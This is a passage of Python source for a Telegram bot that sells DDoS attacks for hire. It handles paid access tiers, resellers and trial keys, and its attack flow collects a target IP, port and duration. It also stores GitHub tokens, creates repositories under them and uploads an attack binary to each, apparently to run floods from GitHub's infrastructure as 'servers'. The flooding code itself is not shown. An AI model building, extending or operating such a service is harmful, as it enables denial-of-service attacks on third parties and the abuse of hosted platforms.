        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **Role:** {role}\n"
        f"• **User ID:** `{user_id}`\n"
        f"• **Username:** @{update.effective_user.username or 'No username'}\n"
        f"• **Expiry:** {expiry}\n"
        f"• **Remaining Attacks:** {remaining_attacks}/{MAX_ATTACKS}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**Attack Access:** {'✅ Yes' if can_user_attack(user_id) else '❌ No'}"
    )

    await update.message.reply_text(message)




async def add_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "add_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD USER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "remove_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➖ **REMOVE USER**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID to remove:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def users_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not approved_users:
        await update.message.reply_text("📭 **NO APPROVED USERS**")
        return

    users_list_text = "👤 **APPROVED USERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    count = 1
    for uid, user_info in list(approved_users.items())[:15]:
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')

        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    hours_left = int(((expiry_time - current_time) % (24 * 3600)) / 3600)
                    remaining = f"{days_left}d {hours_left}h"
            except:
                remaining = "UNKNOWN"

        users_list_text += f"{count}. `{uid}` - @{username} ({days} days) | {remaining}\n"
        count += 1

    users_list_text += f"\n📊 **Total Users:** {len(approved_users)}"
    await update.message.reply_text(users_list_text)

async def pending_requests(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not pending_users:
        await update.message.reply_text("📭 **NO PENDING REQUESTS**")
        return

    pending_list = "⏳ **PENDING REQUESTS**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for user in pending_users[:20]:
        pending_list += f"• `{user['user_id']}` - @{user['username']}\n"

    pending_list += f"\nTo approve: Use Add User button"
    await update.message.reply_text(pending_list)

async def gen_trial_key_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    # Show inline keyboard with hour options
    keyboard = [
        [InlineKeyboardButton("6 Hours", callback_data="trial_6"),
         InlineKeyboardButton("12 Hours", callback_data="trial_12"),
         InlineKeyboardButton("24 Hours", callback_data="trial_24")],
        [InlineKeyboardButton("48 Hours", callback_data="trial_48"),
         InlineKeyboardButton("72 Hours", callback_data="trial_72"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🔑 **GENERATE TRIAL KEY**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Select trial duration:",
        reply_markup=reply_markup
    )

async def price_list(update: Update):
    message = (
        "💰 **PRICE LIST**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "**Regular Users:**\n"
        "• 1 Day - ₹120\n"
        "• 2 Days - ₹240\n"
        "• 3 Days - ₹360\n"
        "• 4 Days - ₹450\n"
        "• 7 Days - ₹650\n\n"
        "**Resellers:**\n"
        "• 1 Day - ₹150\n"
        "• 2 Days - ₹250\n"
        "• 3 Days - ₹300\n"
        "• 4 Days - ₹400\n"
        "• 7 Days - ₹550\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Contact admin to purchase"
    )
    await update.message.reply_text(message)


async def toggle_maintenance(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)

    message = (
        f"🔧 **MAINTENANCE MODE: {'ON' if MAINTENANCE_MODE else 'OFF'}**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: {'🔴 Maintenance enabled' if MAINTENANCE_MODE else '🟢 Bot operational'}"
    )

    await update.message.reply_text(message)

async def set_cooldown_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    keyboard = [
        [InlineKeyboardButton("10s", callback_data="cooldown_10"),
         InlineKeyboardButton("20s", callback_data="cooldown_20"),
         InlineKeyboardButton("30s", callback_data="cooldown_30")],
        [InlineKeyboardButton("40s", callback_data="cooldown_40"),
         InlineKeyboardButton("60s", callback_data="cooldown_60"),
         InlineKeyboardButton("120s", callback_data="cooldown_120")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"⏱️ **SET COOLDOWN**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Current cooldown: {COOLDOWN_DURATION}s\n\n"
        "Select new cooldown duration:",
        reply_markup=reply_markup
    )

async def set_max_attacks_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    keyboard = [
        [InlineKeyboardButton("1", callback_data="maxattack_1"),
         InlineKeyboardButton("5", callback_data="maxattack_5"),
         InlineKeyboardButton("10", callback_data="maxattack_10")],
        [InlineKeyboardButton("20", callback_data="maxattack_20"),
         InlineKeyboardButton("40", callback_data="maxattack_40"),
         InlineKeyboardButton("100", callback_data="maxattack_100")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"🎯 **SET MAX ATTACKS**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Current limit: {MAX_ATTACKS}\n\n"
        "Select new maximum attacks per user:",
        reply_markup=reply_markup
    )

async def admin_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not admins:
        await update.message.reply_text("📭 **NO ADMINS ADDED**")
        return

    admin_list_text = "🛡️ **ADMINS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for admin_id, admin_info in admins.items():
        username = admin_info.get('username', f'admin_{admin_id}')
        admin_list_text += f"• `{admin_id}` - @{username}\n"

    await update.message.reply_text(admin_list_text)


async def add_owner_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "owner_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "👑 **ADD OWNER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_owner_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "owner_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE OWNER**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def add_reseller_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "reseller_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "💰 **ADD RESELLER - STEP 1/3**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_reseller_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "reseller_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE RESELLER**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the User ID to remove:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def owner_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    owners_list = "👑 **OWNERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for owner_id, owner_info in owners.items():
        username = owner_info.get('username', f'owner_{owner_id}')
        is_primary = owner_info.get('is_primary', False)
        added_by = owner_info.get('added_by', 'system')
        owners_list += f"• `{owner_id}` - @{username}"
        if is_primary:
            owners_list += " 👑 (PRIMARY)"
        owners_list += f"\n  Added by: `{added_by}`\n"

    await update.message.reply_text(owners_list)

async def reseller_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not resellers:
        await update.message.reply_text("📭 **NO RESELLERS**")
        return

    resellers_list = "💰 **RESELLERS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for reseller_id, reseller_info in resellers.items():
        username = reseller_info.get('username', f'reseller_{reseller_id}')
        credits = reseller_info.get('credits', 0)
        expiry = reseller_info.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                expiry = expiry_date
            except:
                pass
        resellers_list += f"• `{reseller_id}` - @{username}\n  Credits: {credits} | Expiry: {expiry}\n"

    await update.message.reply_text(resellers_list)

async def broadcast_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "broadcast_message"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📢 **BROADCAST MESSAGE**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the message you want to broadcast to all users:",
        reply_markup=reply_markup
    )

async def upload_binary_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not github_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers added.")
        return

    temp_data[user_id] = {"step": "binary_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📤 **BINARY UPLOAD**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send your binary file...\n"
        "It will be uploaded to all GitHub repos as `primexarmy` file.",
        reply_markup=reply_markup
    )


# ==================== TOKEN MANAGEMENT HANDLERS ====================

async def add_token_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "token_add"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD TOKEN**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Send your GitHub token:\n\n"
        "Example: `ghp_xxxxxxxxxxxxx`",
        reply_markup=reply_markup
    )

async def list_tokens(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not github_tokens:
        await update.message.reply_text("📭 **NO TOKENS ADDED YET**")
        return

    tokens_list = "🔑 **SERVERS LIST:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, token_data in enumerate(github_tokens[:15], 1):
        tokens_list += f"{i}. 👤 `{token_data['username']}`\n   📁 `{token_data['repo']}`\n\n"

    tokens_list += f"📊 **Total Servers:** {len(github_tokens)}"
    await update.message.reply_text(tokens_list)

async def remove_token_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not github_tokens:
        await update.message.reply_text("📭 **NO TOKENS TO REMOVE**")
        return

    temp_data[user_id] = {"step": "token_remove"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE TOKEN**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Send the token number (1-{len(github_tokens)}):\n\n"
        "Example: `1`",
        reply_markup=reply_markup
    )

async def remove_expired_tokens(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    await update.message.reply_text("🔄 **CHECKING TOKENS...**")

    valid_tokens = []
    expired_tokens = []

    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            _ = user.login
            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)

    if not expired_tokens:
        await update.message.reply_text("✅ **ALL TOKENS ARE VALID**")
        return

    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)

    expired_list = "🗑️ **EXPIRED TOKENS REMOVED:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for token in expired_tokens[:10]:
        expired_list += f"• `{token['username']}` - {token['repo']}\n"

    expired_list += f"\n📊 **Remaining Tokens:** {len(valid_tokens)}"
    await update.message.reply_text(expired_list)


# ==================== HELP HANDLER ====================

async def help_handler(update: Update, user_id):
    if is_owner(user_id) or is_admin(user_id):
        message = (
            "🆘 **HELP - AVAILABLE FEATURES**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**For All Users:**\n"
            "• Launch Attack - Start DDoS attack\n"
            "• Check Status - View attack status\n"
            "• Stop Attack - Stop running attack\n"
            "• My Access - Check your access info\n\n"
            "**Admin Features:**\n"
            "• User Management - Add/remove users\n"
            "• Bot Settings - Configure bot\n\n"
            "**Owner Features:**\n"
            "• Owner Panel - Manage owners/resellers\n"
            "• Token Management - Manage GitHub tokens\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Need help? Contact admin."
        )
    elif can_user_attack(user_id):
        message = (
            "🆘 **HELP - AVAILABLE FEATURES**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "• Launch Attack - Start DDoS attack\n"
            "• Check Status - View attack status\n"
            "• Stop Attack - Stop running attack\n"
            "• My Access - Check your access info\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Need help? Contact admin."
        )
    else:
        message = (
            f"🆘 **HELP**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**To Get Access:**\n"
            "1. Use start to request\n"
            "2. Contact admin\n"
            "3. Wait for approval\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Your ID:** `{user_id}`"
        )

    await update.message.reply_text(message)


# ==================== TEXT INPUT HANDLER ====================

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    if user_id not in temp_data:
        return

    step = temp_data[user_id].get("step")

    # Attack flow
    if step == "attack_ip":
        ip = text.strip()
        if not is_valid_ip(ip):
            await update.message.reply_text("⚠️ **INVALID IP**\nIPs starting with '15' or '96' are not allowed.\n\nPlease send a valid IP:")
            return

        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(f"⚠️ **INVALID IP**\n{method_name}\n\nPlease send a valid IP:")
            return

        temp_data[user_id] = {"step": "attack_port", "ip": ip, "method": method}
        await update.message.reply_text(
            "🎯 **LAUNCH ATTACK - STEP 2/3**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ IP: `{ip}`\n\n"
            "Send the target PORT:\n\nExample: `80` or `443`"
        )

    elif step == "attack_port":
        try:
            port = int(text.strip())
            if port <= 0 or port > 65535:
                await update.message.reply_text("❌ **INVALID PORT**\nPort must be between 1 and 65535.\n\nPlease send a valid port:")
                return

            temp_data[user_id]["port"] = port
            temp_data[user_id]["step"] = "attack_time"

            # Show inline keyboard for attack duration
            keyboard = [
                [InlineKeyboardButton("30s", callback_data="attack_time_30"),
                 InlineKeyboardButton("60s", callback_data="attack_time_60"),
                 InlineKeyboardButton("90s", callback_data="attack_time_90")],
                [InlineKeyboardButton("120s", callback_data="attack_time_120"),
                 InlineKeyboardButton("180s", callback_data="attack_time_180"),
                 InlineKeyboardButton("300s", callback_data="attack_time_300")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "🎯 **LAUNCH ATTACK - STEP 3/3**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ IP: `{temp_data[user_id]['ip']}`\n"
                f"✅ Port: `{port}`\n\n"
                "Select attack duration:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID PORT**\nPort must be a number.\n\nPlease send a valid port:")

    # Add user flow
    elif step == "add_user_id":
        try:
            new_user_id = int(text.strip())
            temp_data[user_id]["new_user_id"] = new_user_id
            temp_data[user_id]["step"] = "add_user_days"

            # Show inline keyboard for days
            keyboard = [
                [InlineKeyboardButton("1 Day", callback_data="days_1"),
                 InlineKeyboardButton("2 Days", callback_data="days_2"),
                 InlineKeyboardButton("3 Days", callback_data="days_3")],
                [InlineKeyboardButton("4 Days", callback_data="days_4"),
                 InlineKeyboardButton("7 Days", callback_data="days_7"),
                 InlineKeyboardButton("30 Days", callback_data="days_30")],
                [InlineKeyboardButton("Lifetime", callback_data="days_0"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "➕ **ADD USER - STEP 2/2**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_user_id}`\n\n"
                "Select duration:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Remove user flow
    elif step == "remove_user_id":
        try:
            user_to_remove = int(text.strip())
            user_to_remove_str = str(user_to_remove)

            removed = False

            if user_to_remove_str in approved_users:
                del approved_users[user_to_remove_str]
                save_approved_users(approved_users)
                removed = True

            pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
            save_pending_users(pending_users)

            if user_to_remove_str in user_attack_counts:
                del user_attack_counts[user_to_remove_str]
                save_user_attack_counts(user_attack_counts)

            if removed:
                reply_markup = get_main_keyboard(user_id)
                await update.message.reply_text(
                    f"✅ **USER ACCESS REMOVED**\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"User ID: `{user_to_remove}`\n"
                    f"Removed by: `{user_id}`",
                    reply_markup=reply_markup
                )

                try:
                    await context.bot.send_message(
                        chat_id=user_to_remove,
                        text="🚫 **YOUR ACCESS HAS BEEN REMOVED**\n━━━━━━━━━━━━━━━━━━━━━━\nYour access to the bot has been revoked."
                    )
                except:
                    pass
            else:
                await update.message.reply_text(f"❌ **USER NOT FOUND**\nUser ID `{user_to_remove}` not found.")

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Owner add flow
    elif step == "owner_add_id":
        try:
            new_owner_id = int(text.strip())
            temp_data[user_id]["new_owner_id"] = new_owner_id
            temp_data[user_id]["step"] = "owner_add_username"

            await update.message.reply_text(
                "👑 **ADD OWNER - STEP 2/2**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{new_owner_id}`\n\n"
                "Send the username:\n\nExample: `john`"
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    elif step == "owner_add_username":
        username = text.strip()
        new_owner_id = temp_data[user_id]["new_owner_id"]

        if str(new_owner_id) in owners:
            await update.message.reply_text("❌ This user is already an owner")
            del temp_data[user_id]
            return

        owners[str(new_owner_id)] = {
            "username": username,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": False
        }
        save_owners(owners)

        if str(new_owner_id) in admins:
            del admins[str(new_owner_id)]
            save_admins(admins)

        if str(new_owner_id) in resellers:
            del resellers[str(new_owner_id)]
            save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=new_owner_id,
                text="👑 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have been added as an owner of the bot!\nYou now have full access to all admin features."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **OWNER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Owner ID: `{new_owner_id}`\n"
            f"Username: @{username}\n"
            f"Added by: `{user_id}`",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # Owner remove flow
    elif step == "owner_remove_id":
        try:
            owner_to_remove = int(text.strip())

            if str(owner_to_remove) not in owners:
                await update.message.reply_text("❌ This user is not an owner")
                del temp_data[user_id]
                return

            if owners[str(owner_to_remove)].get("is_primary", False):
                await update.message.reply_text("❌ Cannot remove primary owner")
                del temp_data[user_id]
                return

            removed_username = owners[str(owner_to_remove)].get("username", "")
            del owners[str(owner_to_remove)]
            save_owners(owners)

            try:
                await context.bot.send_message(
                    chat_id=owner_to_remove,
                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━━\nYour owner access has been revoked from the bot."
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **OWNER REMOVED**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Owner ID: `{owner_to_remove}`\n"
                f"Username: @{removed_username}\n"
                f"Removed by: `{user_id}`",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Reseller add flow
    elif step == "reseller_add_id":
        try:
            reseller_id = int(text.strip())
            temp_data[user_id]["reseller_id"] = reseller_id
            temp_data[user_id]["step"] = "reseller_add_credits"

            # Show inline keyboard for credits
            keyboard = [
                [InlineKeyboardButton("50", callback_data="credits_50"),
                 InlineKeyboardButton("100", callback_data="credits_100"),
                 InlineKeyboardButton("200", callback_data="credits_200")],
                [InlineKeyboardButton("500", callback_data="credits_500"),
                 InlineKeyboardButton("1000", callback_data="credits_1000"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "💰 **ADD RESELLER - STEP 2/3**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ User ID: `{reseller_id}`\n\n"
                "Select credits:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    elif step == "reseller_add_username":
        username = text.strip()
        reseller_id = temp_data[user_id]["reseller_id"]
        credits = temp_data[user_id]["credits"]

        if str(reseller_id) in resellers:
            await update.message.reply_text("❌ This user is already a reseller")
            del temp_data[user_id]
            return

        resellers[str(reseller_id)] = {
            "username": username,
            "credits": credits,
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": "LIFETIME",
            "total_added": 0
        }
        save_resellers(resellers)

        try:
            await context.bot.send_message(
                chat_id=reseller_id,
                text=f"💰 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have been added as a reseller!\nInitial credits: {credits}\n\nYou can now manage users."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"✅ **RESELLER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Reseller ID: `{reseller_id}`\n"
            f"Username: @{username}\n"
            f"Credits: {credits}\n"
            f"Added by: `{user_id}`",
            reply_markup=reply_markup
        )

        del temp_data[user_id]

    # Reseller remove flow
    elif step == "reseller_remove_id":
        try:
            reseller_to_remove = int(text.strip())

            if str(reseller_to_remove) not in resellers:
                await update.message.reply_text("❌ This user is not a reseller")
                del temp_data[user_id]
                return

            removed_username = resellers[str(reseller_to_remove)].get("username", "")
            del resellers[str(reseller_to_remove)]
            save_resellers(resellers)

            try:
                await context.bot.send_message(
                    chat_id=reseller_to_remove,
                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━━\nYour reseller access has been revoked from the bot."
                )
            except:
                pass

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **RESELLER REMOVED**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Reseller ID: `{reseller_to_remove}`\n"
                f"Username: @{removed_username}\n"
                f"Removed by: `{user_id}`",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")

    # Token add flow
    elif step == "token_add":
        token = text.strip()
        repo_name = "primexarmy-tg"

        try:
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text("❌ Token already exists.")
                    del temp_data[user_id]
                    return

            await update.message.reply_text("🔄 **ADDING TOKEN...**")

            g = Github(token)
            user = g.get_user()
            username = user.login

            repo, created = create_repository(token, repo_name)

            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)

            # ✅ NEW: Auto-upload binary file to new repo
            binary_content = load_binary_file()
            binary_upload_status = ""
            if binary_content:
                success, status = upload_binary_to_repo(new_token_data, binary_content)
                if success:
                    binary_upload_status = f"\n✅ Binary file uploaded: {status}"
                else:
                    binary_upload_status = f"\n⚠️ Binary upload failed: {status}"
            else:
                binary_upload_status = "\n⚠️ No binary file found. Upload one using 'Upload Binary' button."

            reply_markup = get_main_keyboard(user_id)
            if created:
                message = (
                    f"✅ **NEW REPO CREATED & TOKEN ADDED!**\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 Username: `{username}`\n"
                    f"📁 Repo: `{repo_name}`\n"
                    f"📊 Total servers: {len(github_tokens)}"
                    f"{binary_upload_status}"
                )
            else:
                message = (
                    f"✅ **TOKEN ADDED TO EXISTING REPO!**\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 Username: `{username}`\n"
                    f"📁 Repo: `{repo_name}`\n"
                    f"📊 Total servers: {len(github_tokens)}"
                    f"{binary_upload_status}"
                )

            await update.message.reply_text(message, reply_markup=reply_markup)
            del temp_data[user_id]

        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\nPlease check the token.")
            del temp_data[user_id]

    # Token remove flow
    elif step == "token_remove":
        try:
            token_num = int(text.strip())
            if token_num < 1 or token_num > len(github_tokens):
                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}")
                del temp_data[user_id]
                return

            removed_token = github_tokens.pop(token_num - 1)
            save_github_tokens(github_tokens)

            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **SERVER REMOVED!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 Server: `{removed_token['username']}`\n"
                f"📁 Repo: `{removed_token['repo']}`\n"
                f"📊 Remaining: {len(github_tokens)}",
                reply_markup=reply_markup
            )

            del temp_data[user_id]

        except ValueError:
            await update.message.reply_text("❌ **INVALID NUMBER**\nPlease send a valid number.")

    # Broadcast flow
    elif step == "broadcast_message":
        message = text
        del temp_data[user_id]
        await send_broadcast(update, context, message, user_id)

    # Binary upload flow
    elif step == "binary_upload":
        await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")


# ==================== CALLBACK QUERY HANDLER ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Cancel operation
    if data == "cancel_operation":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await query.message.reply_text("❌ **OPERATION CANCELLED**", reply_markup=reply_markup)
        await query.message.delete()
        return

    # Trial key generation
    if data.startswith("trial_"):
        hours = int(data.split("_")[1])
        key = generate_trial_key(hours)

        await query.message.edit_text(
            f"🔑 **TRIAL KEY GENERATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Key: `{key}`\n"
            f"Duration: {hours} hours\n"
            f"Expires: in {hours} hours\n\n"
            "Users can redeem with this key."
        )
        return

    # Cooldown setting
    if data.startswith("cooldown_"):
        cooldown = int(data.split("_")[1])

        global COOLDOWN_DURATION
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)

        await query.message.edit_text(
            f"✅ **COOLDOWN UPDATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"New cooldown: `{COOLDOWN_DURATION}` seconds"
        )
        return

    # Max attacks setting
    if data.startswith("maxattack_"):
        max_attacks = int(data.split("_")[1])

